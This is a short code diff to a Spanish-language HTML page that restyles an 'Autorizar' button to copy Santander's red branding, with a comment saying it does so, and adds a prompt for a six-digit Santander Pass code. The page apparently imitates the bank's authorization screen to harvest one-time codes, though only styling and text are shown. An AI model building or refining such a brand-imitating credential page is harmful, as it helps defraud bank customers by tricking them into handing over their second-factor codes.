@@ -23,6 +23,28 @@
       margin-top: 15px;
       font-weight: bold;
       color: #333;
+      text-align: center;
+    }
+    .btn-santander {
+      background-color: #e60000;
+      color: #fff;
+      border: none;
+      padding: 12px 20px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      margin-top: 20px;
+    }
+    .btn-santander .bg-arrow {
+      display: inline-block;
+      margin-left: 8px;
+      width: 0; 
+      height: 0; 
+      border-top: 6px solid transparent;
+      border-bottom: 6px solid transparent;
+      border-left: 8px solid #fff;
     }
   </style>
 </head>
@@ -32,8 +54,13 @@
 
     <h2>Se enviará una autorización a tu Aplicación</h2>
     <p class="sub-text">AUTORIZA CON TU SANTANDER PASS</p>
+    <p class="sub-text">Clave única de 6 dígitos con su App Santander Pass</p>
 
-    <button id="autorizarBtn" class="btn-rojo">Autorizar</button>
+    <!-- Botón con formato Santander -->
+    <button class="btn-santander" type="button" id="autorizarBtn">
+      AUTORIZAR<span class="bg-arrow"></span>
+    </button>
+
     <div id="resultado"></div>
   </div>
 
